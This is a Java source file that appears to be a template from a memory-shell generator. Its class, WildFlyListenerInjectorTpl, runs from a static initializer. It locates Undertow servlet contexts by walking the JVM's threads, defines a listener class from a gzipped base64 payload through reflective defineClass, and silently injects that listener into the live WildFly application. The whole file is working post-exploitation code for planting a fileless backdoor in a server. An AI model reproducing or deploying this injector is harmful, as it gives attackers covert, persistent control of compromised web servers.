package jmg.core.template;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;


public class WildFlyListenerInjectorTpl {
    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new WildFlyListenerInjectorTpl();
    }

    public WildFlyListenerInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object listener = getListener(context);
                injectListener(context, listener);
            }
        } catch (Exception ignored) {
        }

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        for (int i = 0; i < threads.length; i++) {
            try {
                Object requestContext = invokeMethod(threads[i].getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
                if (servletContext != null) contexts.add(servletContext);
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }


    private Object getListener(Object context) {

        Object listener = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            listener = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                listener = clazz.newInstance();
            } catch (Throwable tt) {
            }
        }
        return listener;
    }

    // 添加有效 io.undertow.servlet.core.ApplicationListeners.addListener
    // 添加无效 io.undertow.servlet.api.DeploymentInfo.addListener
    public void injectListener(Object context, Object listener) {
        try {
            if (isInjected(context, listener.getClass().getName())) {
                return;
            }
            Class listenerInfoClass = Class.forName("io.undertow.servlet.api.ListenerInfo");
            Object listenerInfo = listenerInfoClass.getConstructor(Class.class).newInstance(listener.getClass());
            Object deploymentImpl = getFV(context, "deployment");
            Object applicationListeners = getFV(deploymentImpl, "applicationListeners");
            Class managedListenerClass = Class.forName("io.undertow.servlet.core.ManagedListener");
            Object managedListener = managedListenerClass.getConstructor(listenerInfoClass, boolean.class).newInstance(listenerInfo, true);
            invokeMethod(applicationListeners, "addListener", new Class[]{managedListenerClass}, new Object[]{managedListener});
        } catch (Throwable e) {
        }
    }

    public boolean isInjected(Object context, String className) throws Exception {
        List allListeners = (List) getFV(getFV(getFV(context, "deployment"), "applicationListeners"), "allListeners");
        for (int i = 0; i < allListeners.size(); i++) {
            Class listener = (Class) getFV(getFV(allListeners.get(i), "listenerInfo"), "listenerClass");
            if (listener.getName().contains(className)) {
                return true;
            }
        }
        return false;
    }


    public static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }


    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }


    private static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
